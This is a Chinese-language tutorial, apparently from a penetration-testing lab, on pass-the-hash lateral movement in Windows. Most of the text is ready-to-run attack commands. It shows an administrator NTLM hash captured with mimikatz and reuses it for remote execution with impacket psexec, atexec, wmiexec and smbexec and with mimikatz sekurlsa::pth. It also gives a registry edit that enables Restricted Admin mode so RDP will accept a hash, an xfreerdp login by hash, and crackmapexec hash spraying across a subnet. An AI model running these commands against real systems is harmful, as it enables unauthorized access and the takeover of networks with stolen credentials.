  * 前言  
当获取的服务器大于windows server 2008 时无法利用mimikatz获取服务器的明文，使得无法利用明文进行横向。这里介绍利用获取的NTML
hash进行PTH横向。  
注：只能是administrator、域管用户的哈希值才能进行哈希传递攻击，其他用户(包括加入管理员组用户但是非administrator)，域普通用户也不能使用哈希传递攻击。  
利用工具获取服务器的NTLM，这里使用cs上线win2016机器，利用mimikatz进行抓取凭证。

    
    
    ./Administrator c6de864a0d3ba9437e6a1e0789d4a844

![](./img/9207751156464780067.png)  
微软也提供PSTOOLS包工具，但不支持使用hash传递。以下使用的为impacket-examples-windows工具，它支持利用hash传递。因为第三方，所以需要解决绕过杀软问题。

  * Psexec  
利用445端口，会上传一个文件到c:\windows下，命令执行结束后会删除。

    
        psexec -hashes :c6de864a0d3ba9437e6a1e0789d4a844 ./administrator@192.168.100.129

![](./img/4425111761398058160.png)  
![](./img/2275810697971070340.png)

  * Atexec  
利用139和445端口，它会创建计划任务-执行计划任务-删除计划任务  
Atexec -hashes :c6de864a0d3ba9437e6a1e0789d4a844
./administrator@192.168.100.129 "whoami"  
![](./img/2597119272148900789.png)  
![](./img/9102978427287771043.png)

  * Wmiexec  
利用135端口

    
        wmiexec.exe -hashes :c6de864a0d3ba9437e6a1e0789d4a844 ./administrator@192.168.100.129  "whoami"

![](./img/7684529383617463275.png)

  * Smbexec  
和psexec类似

    
        Smbexec.exe -hashes :c6de864a0d3ba9437e6a1e0789d4a844 ./administrator@192.168.100.129

![](./img/1172771522059450425.png)

  * Mimikatz
    
        Privilege::debug
    sekurlsa::pth /user:administrator /domain:workgroup /ntlm:c6de864a0d3ba9437e6a1e0789d4a844

![](./img/1353841951176843775.png)

  * hash 进行rdp登录  
使用hash远程登录RDP，需要开启"Restricted Admin Mode"

![](./img/3273011777554960067.png)

    
    
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f //开启Restricted Admin mode

1，利用mimikatz进行rdp登录。  
这里还有一个问题，客户端需要支持Restricted Admin mode。如果当前系统不支持Restricted Admin
mode，执行mstsc.exe /restrictedadmin后弹出远程桌面的参数说明  
![](./img/247824282292061911.png)

    
    
    sekurlsa::pth /user:administrator /domain:192.168.100.164 /ntlm:c6de864a0d3ba9437e6a1e0789d4a844 "/run:mstsc.exe /restrictedadmin"

![](./img/5443927233562751759.png)  
2，利用xfreerdp进行rdp登录，kali自带该工具

    
    
    xfreerdp /v:192.168.100.164 /u:administrator /pth:c6de864a0d3ba9437e6a1e0789d4a844   /cert:ignore

![](./img/1632928489822676819.png)

  * pth批量爆破  
利用crackmapexec进行密码喷洒，喷洒本地administrator

    
        crackmapexec  smb 192.168.100.0/24   -u  administrator   -H  NTLM-HASH.txt（收集到的hash字典）    -x  whoami    -d  workgroup

![](./img/191922538078254275.png)

  * 其他  
这里尝试了利用普通账号，加入管理员组的账号，普通域账号，加入域管组的域账号进行pth攻击  
本地普通用户  
![](./img/6858369038428566461.png)

加入管理员组的本地账号  
![](./img/6724096752482329553.png)

![](./img/1237989996697142798.png)

域普通账号  
![](./img/1395874346080516758.png)

加入域管理员组的账号  
![](./img/3302702124174329319.png)

![](./img/5167713092608958141.png)

